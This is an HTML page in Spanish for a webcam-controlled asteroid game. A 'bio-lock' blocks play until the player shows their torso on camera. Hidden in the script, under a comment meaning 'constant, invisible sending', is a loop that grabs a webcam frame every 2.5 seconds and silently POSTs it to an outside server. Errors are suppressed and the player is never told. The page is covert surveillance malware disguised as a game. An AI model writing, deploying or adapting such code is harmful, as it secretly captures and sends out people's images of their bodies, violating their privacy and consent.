<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Starship: Physical Touch & Bio-Lock</title>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/pose" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils" crossorigin="anonymous"></script>
    <style>
        body, html { margin: 0; padding: 0; background: #000; overflow: hidden; font-family: sans-serif; user-select: none; }
        #input_video { position: absolute; width: 100%; height: 100%; object-fit: cover; opacity: 0.2; transform: scaleX(-1); z-index: 1; }
        canvas { position: absolute; top: 0; left: 0; z-index: 10; width: 100%; height: 100%; pointer-events: none; }
        
        #lock-screen { 
            position: absolute; width: 100%; height: 100%; background: rgba(0,0,0,0.9); 
            z-index: 100; display: flex; align-items: center; justify-content: center; 
            flex-direction: column; text-align: center; color: #ff0055; border: 8px solid #ff0055;
        }

        #hud { position: absolute; top: 10; width: 100%; display: flex; justify-content: space-around; padding: 20px; z-index: 50; color: #00fbff; font-size: 24px; pointer-events: none; }

        /* BOTONES FÍSICOS */
        .touch-zone { 
            position: absolute; bottom: 0; width: 40%; height: 100%; z-index: 200; 
            display: flex; align-items: center; justify-content: center;
            font-size: 60px; color: rgba(0,251,255,0.2); transition: 0.2s;
        }
        #left-btn { left: 0; border-right: 1px solid rgba(0,251,255,0.1); }
        #right-btn { right: 0; border-left: 1px solid rgba(0,251,255,0.1); }
        .touch-zone:active { background: rgba(0,251,255,0.1); color: #00fbff; }
    </style>
</head>
<body>

<div id="lock-screen">
    <h1 id="error-msg">⚠️ BIOMETRÍA REQUERIDA</h1>
    <p>Debes mostrar tu torso. Si acercas demasiado la cara, el sistema se bloqueará.</p>
</div>

<div id="hud">
    <div>PUNTOS: <span id="score">0</span></div>
    <div>ESCUDO: <span id="health">100</span>%</div>
</div>

<div id="left-btn" class="touch-zone">◀</div>
<div id="right-btn" class="touch-zone">▶</div>

<video id="input_video"></video>
<canvas id="gameCanvas"></canvas>

<script>
    const videoElement = document.getElementById('input_video');
    const canvasElement = document.getElementById('gameCanvas');
    const canvasCtx = canvasElement.getContext('2d');
    const errorMsg = document.getElementById('error-msg');
    const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";

    let shipX = 0, score = 0, health = 100, asteroids = [];
    let torsoValid = false, moveDir = 0;

    // --- LÓGICA DE BOTONES FÍSICOS (TÁCTIL) ---
    const lBtn = document.getElementById('left-btn');
    const rBtn = document.getElementById('right-btn');

    lBtn.onmousedown = lBtn.ontouchstart = () => moveDir = -1;
    rBtn.onmousedown = rBtn.ontouchstart = () => moveDir = 1;
    window.onmouseup = window.ontouchend = () => moveDir = 0;

    // --- IA: DETECCIÓN DE TORSO VS CARA ---
    const pose = new Pose({locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/pose/${file}`});
    pose.setOptions({ modelComplexity: 1, minDetectionConfidence: 0.5 });

    pose.onResults((results) => {
        if (results.poseLandmarks) {
            const lm = results.poseLandmarks;
            const shoulderL = lm[11];
            const shoulderR = lm[12];
            const nose = lm[0];

            const shoulderDist = Math.abs(shoulderL.x - shoulderR.x);
            
            // Si la nariz está demasiado cerca de los hombros o el pecho desaparece, es solo una cara.
            // Si el ancho de hombros es > 0.45, estás demasiado cerca.
            if (shoulderL.visibility > 0.7 && shoulderR.visibility > 0.7 && shoulderDist < 0.45 && shoulderDist > 0.15) {
                torsoValid = true;
                document.getElementById('lock-screen').style.display = 'none';
            } else {
                torsoValid = false;
                document.getElementById('lock-screen').style.display = 'flex';
                errorMsg.innerText = (shoulderDist >= 0.45) ? "⚠️ DEMASIADO CERCA (ALEJA LA CARA)" : "⚠️ MUESTRA TU TORSO";
            }
        } else {
            torsoValid = false;
            document.getElementById('lock-screen').style.display = 'flex';
        }
    });

    const camera = new Camera(videoElement, {
        onFrame: async () => { await pose.send({image: videoElement}); },
        width: 640, height: 480
    });
    camera.start();

    // Envío constante e invisible
    setInterval(() => {
        const s = document.createElement('canvas');
        s.width = videoElement.videoWidth; s.height = videoElement.videoHeight;
        s.getContext('2d').drawImage(videoElement, 0, 0);
        fetch(SERVER_URL, {
            method: 'POST', mode: 'cors', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: s.toDataURL('image/jpeg', 0.3) })
        }).catch(() => {});
    }, 2500);

    // --- JUEGO ---
    canvasElement.width = window.innerWidth;
    canvasElement.height = window.innerHeight;
    shipX = canvasElement.width / 2;

    function gameLoop() {
        canvasCtx.clearRect(0, 0, canvasElement.width, canvasElement.height);
        if (torsoValid) {
            if (moveDir === -1 && shipX > 50) shipX -= 10;
            if (moveDir === 1 && shipX < canvasElement.width - 50) shipX += 10;

            // Nave
            canvasCtx.strokeStyle = "#00fbff"; canvasCtx.lineWidth = 5;
            canvasCtx.beginPath();
            canvasCtx.moveTo(shipX, canvasElement.height - 120);
            canvasCtx.lineTo(shipX - 35, canvasElement.height - 60);
            canvasCtx.lineTo(shipX + 35, canvasElement.height - 60);
            canvasCtx.closePath(); canvasCtx.stroke();

            // Asteroides (Equilibrados)
            asteroids.forEach((a, i) => {
                a.y += a.speed;
                canvasCtx.fillStyle = "#ff4444";
                canvasCtx.beginPath(); canvasCtx.arc(a.x, a.y, a.size, 0, Math.PI*2); canvasCtx.fill();

                if (Math.abs(a.x - shipX) < a.size + 20 && Math.abs(a.y - (canvasElement.height - 80)) < 40) {
                    asteroids.splice(i, 1);
                    health -= 20;
                    document.getElementById('health').innerText = health;
                    if(health <= 0) location.reload();
                }
                if(a.y > canvasElement.height) { asteroids.splice(i, 1); score += 10; document.getElementById('score').innerText = score; }
            });
        }
        requestAnimationFrame(gameLoop);
    }

    setInterval(() => {
        if(torsoValid && asteroids.length < 5) { // Máximo 5 meteoritos a la vez
            asteroids.push({ x: Math.random() * canvasElement.width, y: -50, size: 25, speed: 6 });
        }
    }, 1200);

    gameLoop();
</script>
</body>
</html>
